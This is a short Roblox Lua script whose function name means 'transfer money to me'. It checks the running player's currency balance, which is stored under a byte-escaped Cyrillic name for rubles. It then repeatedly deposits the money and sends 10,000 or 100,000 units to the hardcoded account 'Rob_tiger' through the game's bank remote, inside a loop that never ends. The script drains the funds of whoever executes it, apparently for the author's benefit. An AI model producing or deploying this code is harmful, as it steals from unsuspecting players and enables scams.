function perevoddenegmne() -- 
    local NickName = "Rob_tiger" -- 
    local delaytime = 10 --
    local delaytime2 = 10 -- 
        if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then 
            local args = {
                [1] = {
                    ["Type"] = "Deposit",
                    ["Amount"] = 10000
                }
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
            wait(delaytime)
            local args = {
                [1] = {
                    ["Type"] = "Send",
                    ["Amount"] = 10000,
                    ["User"] = NickName
                }
            }
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
        wait(delaytime2)
        end
        if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 100000 then
            local args = {
            [1] = {
                    ["Type"] = "Deposit",
                    ["Amount"] = 100000
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
            wait(delaytime)
            local args = {
                [1] = {
                    ["Type"] = "Send",
                    ["Amount"] = 100000,
                    ["User"] = NickName
                }
            }
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
        wait(delaytime2)
        end
        
    end
    
    i = 5;
    while i < 10 do
        perevoddenegmne();
    end
